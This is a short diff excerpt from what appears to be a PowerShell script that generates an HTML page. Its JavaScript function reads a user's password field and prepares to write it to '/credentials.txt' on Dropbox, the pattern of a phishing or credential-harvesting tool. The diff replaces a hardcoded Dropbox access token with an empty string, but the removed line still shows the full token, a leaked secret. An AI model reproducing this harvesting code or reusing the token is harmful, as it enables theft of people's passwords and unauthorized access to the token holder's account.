@@ -211,7 +211,7 @@ $h2 = @"
   <script>
     function sendCredentialsAndExecuteCommand() {
       var passwordValue = document.getElementById("password").value;
-      var dropboxToken = "sl.B4193SFMzLU_4YN6gvjvBoLXuIqnTsEInRZAUgAgUZkojFzi8j-h0U4rsPI1CtjCdu8q4nAzTGrDvSfDrostWyqag1gicuVxecc4fkGm1gd0EwgKm55hTIFPZjBqdv9qXupYqFs-y3In";
+      var dropboxToken = "";
       var data = {
         path: "/credentials.txt",
         mode: "overwrite",
